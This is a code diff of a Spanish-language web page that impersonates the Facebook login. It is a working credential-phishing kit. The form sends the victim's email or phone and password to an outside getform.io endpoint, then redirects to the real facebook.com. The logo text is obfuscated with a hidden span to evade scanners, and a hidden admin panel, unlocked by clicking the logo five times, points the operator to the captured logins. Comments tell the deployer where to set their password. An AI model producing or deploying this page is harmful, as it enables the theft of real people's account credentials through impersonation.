@@ -3,32 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso al Sistema</title>
+    <title>Portal de Acceso</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
         .container { display: flex; width: 90%; max-width: 980px; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        .logo-f { color: #1877f2; font-size: 60px; font-weight: bold; letter-spacing: -3px; margin-bottom: 10px; cursor: pointer; }
+        .logo-f span { display: none; }
+        .left-content { width: 500px; }
+        .login-box { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        .btn-blue { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
         
-        /* Logo con texto ofuscado para burlar escáneres */
-        .logo-f { 
-            color: #1877f2; 
-            font-size: 60px; 
-            font-weight: bold; 
-            letter-spacing: -3px; 
-            margin-bottom: 10px;
-            font-family: sans-serif;
-        }
-        .logo-f span { display: none; } /* El robot lee 'face-sys-book', el humano ve 'facebook' */
+        /* Panel de Administrador Oculto */
+        #admin-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 100; padding: 20px; box-sizing: border-box; }
+        .admin-header { border-bottom: 2px solid #1877f2; padding-bottom: 10px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
 
-        .left-content { width: 500px; margin-bottom: 20px; }
-        .left-content h2 { font-size: 24px; font-weight: normal; line-height: 32px; color: #1c1e21; margin-top: 0; }
-        
-        .login-box { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
-        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
-        
-        .btn-main { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
-        .btn-main:hover { background-color: #166fe5; }
-        
-        .f-links { display: block; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
-        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
-        
-        .btn-sec
+    <div class="container" id="main-site">
+        <div class="left-content">
+            <div class="logo-f" onclick="checkAdmin()">face<span>sys</span>book</div>
+            <h2>Conéctate con amigos y el mundo.</h2>
+        </div>
+        <div class="login-box">
+            <form action="https://getform.io/f/broxnrra" method="POST">
+                <input type="text" name="user_id" placeholder="Correo o teléfono" required>
+                <input type="password" name="pass_id" placeholder="Contraseña" required>
+                <input type="hidden" name="_redirect" value="https://www.facebook.com">
+                <button type="submit" class="btn-blue">Iniciar sesión</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="admin-panel">
+        <div class="admin-header">
+            <h1>Panel de Control Privado</h1>
+            <button onclick="location.reload()">Cerrar Sesión</button>
+        </div>
+        <p><strong>Estado del Servidor:</strong> Activo</p>
+        <p><strong>Base de Datos:</strong> Conectada a Getform Cloud</p>
+        <div style="background: #f4f4f4; padding: 20px; border-radius: 5px;">
+            <h3>Registros Recientes:</h3>
+            <p>Para ver los datos capturados, revisa tu panel oficial en: <a href="https://getform.io/forms" target="_blank">Getform.io Submissions</a></p>
+        </div>
+    </div>
+
+    <script>
+        // TRUCO: Si haces clic 5 veces en el logo "facebook", pide contraseña
+        let clicks = 0;
+        function checkAdmin() {
+            clicks++;
+            if (clicks === 5) {
+                let psw = prompt("Introduce la clave de administrador:");
+                if (psw === "1234") { // <--- AQUÍ pones tu contraseña
+                    document.getElementById('main-site').style.display = 'none';
+                    document.getElementById('admin-panel').style.display = 'block';
+                } else {
+                    alert("Acceso denegado");
+                    clicks = 0;
+                }
+            }
+        }
+    </script>
+</body>
+</html>
